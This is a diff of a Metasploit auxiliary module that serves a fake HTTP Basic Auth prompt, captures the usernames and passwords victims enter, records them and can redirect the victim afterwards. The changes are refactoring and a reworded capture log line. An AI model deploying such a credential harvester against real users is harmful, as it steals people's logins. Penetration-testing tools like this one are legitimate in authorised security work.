@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
@@ -41,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
         OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
         OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
-      ], self.class)
+      ])
   end
 
   # Not compatible today
@@ -54,7 +51,6 @@ class MetasploitModule < Msf::Auxiliary
     @myport   = datastore['SRVPORT']
     @realm    = datastore['REALM']
 
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit
   end
 
@@ -98,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
         proof: req['Authorization']
       )
 
-      print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
+      print_good("HTTP Basic Auth LOGIN #{cli.peerhost} \"#{user}:#{pass}\" / #{req.resource}")
       if datastore['RedirectURL']
         print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
         send_redirect(cli, datastore['RedirectURL'])
@@ -112,5 +108,4 @@ class MetasploitModule < Msf::Auxiliary
       cli.send_response(response)
     end
   end
-
 end
